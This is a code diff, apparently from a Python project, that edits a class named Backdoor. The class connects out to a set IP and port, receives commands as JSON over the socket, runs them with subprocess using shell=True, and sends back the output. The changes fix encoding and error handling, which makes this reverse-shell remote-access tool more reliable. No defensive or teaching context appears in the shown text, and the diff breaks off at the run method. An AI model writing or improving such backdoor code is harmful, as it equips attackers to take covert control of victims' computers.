@@ -12,16 +12,26 @@ class Backdoor:
         self.connection.connect((self.ip, self.port))
 
     def reliable_send(self, data):
+        try:
+            data = data.decode("utf-8")
+        except:
+            pass
+
         json_data = json.dumps(data)
+        json_data = json_data.encode("utf-8")
         self.connection.send(json_data)
 
     def reliable_receive(self):
         json_data = self.connection.recv(1024)
         json_data = json_data.decode("utf-8")
-        return json.loads(json_data)
+        command = json.loads(json_data)
+        return command
 
     def execute_system_command(self, command):
-        return subprocess.check_output(command, shell=True)
+        try:
+            return subprocess.check_output(command, shell=True)
+        except subprocess.CalledProcessError:
+            self.reliable_send("[-] Unknown command")
 
     def run(self):
         try:
